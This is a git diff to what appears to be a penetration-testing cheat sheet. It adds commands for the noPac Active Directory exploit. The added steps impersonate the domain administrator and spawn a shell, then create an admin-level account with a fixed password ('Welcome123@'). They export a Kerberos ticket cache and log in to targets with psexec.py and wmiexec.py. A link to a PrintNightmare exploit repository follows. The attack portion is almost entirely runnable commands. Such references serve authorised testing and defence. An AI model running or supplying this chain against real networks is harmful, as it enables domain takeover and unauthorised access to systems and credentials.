@@ -590,9 +590,26 @@ git clone https://github.com/Ridter/noPac.git
 sudo python3 scanner.py <domain>/<username>:<password> -dc-ip <domain controller> -use-ldap
 ```
 
+method1 interactive shell
+
 ```shell
 # Use the full path to get files
 sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <domain controller> -dc-host <hostname> -shell --impersonate administrator -use-ldap
+```
+
+method2 using TGT_ccache_file
+
+```shell
+# specify the new username and password with administrator permission
+sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <domain controller> -dc-host <hostname> --impersonate administrator -use-ldap -target-name 'admin01' -new-pass 'Welcome123@'
+# using cache file
+export KRB5CCNAME=<TGT_ccache_file>
+# showing Kerberos credentials cache
+klist
+# login method1
+python3 psexec.py -k -no-pass <target>
+# login method2
+wmiexec.py -k -no-pass <target>
 ```
 
 - [PrintNightmare](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527)
